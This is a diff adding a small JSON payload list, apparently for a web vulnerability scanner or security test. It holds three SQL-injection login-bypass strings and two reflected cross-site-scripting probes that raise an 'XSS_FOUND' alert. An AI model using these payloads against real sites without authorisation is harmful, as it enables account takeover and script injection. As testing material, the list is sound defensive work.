@@ -1,0 +1,11 @@
+{
+  "sqli_auth_bypass": [
+    "' OR 1=1 -- ",
+    "' OR '1'='1",
+    "admin' #"
+  ],
+  "xss_reflected": [
+    "<script>alert('XSS_FOUND')</script>",
+    "<img src=x onerror=alert('XSS_FOUND')>"
+  ]
+}
